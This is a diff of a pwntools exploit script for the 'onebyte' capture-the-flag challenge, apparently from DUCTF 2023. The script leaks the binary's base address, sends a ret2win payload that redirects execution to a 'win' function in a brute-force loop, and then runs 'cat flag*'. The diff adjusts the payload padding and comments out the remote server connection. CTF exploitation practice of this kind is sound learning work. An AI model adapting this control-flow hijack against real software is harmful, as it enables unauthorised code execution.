@@ -235,7 +235,7 @@ filterwarnings('ignore')
 context.update(arch='i386')
 exe = './onebyte'
 elf = context.binary = ELF(exe, checksec=False)
-context.log_level = 'info'
+context.log_level = 'INFO'
 
 def start(argv=[], *a, **kw):
     if args.GDB:
@@ -254,25 +254,26 @@ continue
 #                    EXPLOIT GOES HERE
 #===========================================================
 
-for i in range(0xff+1):
+for i in range(20):
     try:
         io = start()
+        # io = remote('2023.ductf.dev', '30018')
 
-        io = remote('2023.ductf.dev', '30018')
-
+        # Leak & Calculate ELF Base Address
         io.recvuntil('Free junk:')
         init = int(io.recvline().strip().decode(), 16)
         elf.address = init - (0x565561bd - 0x56555000)
         log.info("Elf base address: 0x%x", elf.address)
         log.info("Jumping to address: 0x%x", elf.sym['win'])
 
-        payload = p32(elf.sym['win']) + b'A'*8 + b'C'*4 + b'D'
+        # Ret2Win Payload
+        payload = p32(elf.sym['win']) + b'A'*4 + b'B'*4 + b'C'*4 + b'D'
 
         io.recvuntil('Your turn:')
         io.send(payload)
         io.sendline('cat flag*')
-
-        print(io.recvall().decode())
+        res = io.recvline().decode()
+        log.info(f"Flag: {res}")
         io.close()
     except Exception:
         pass
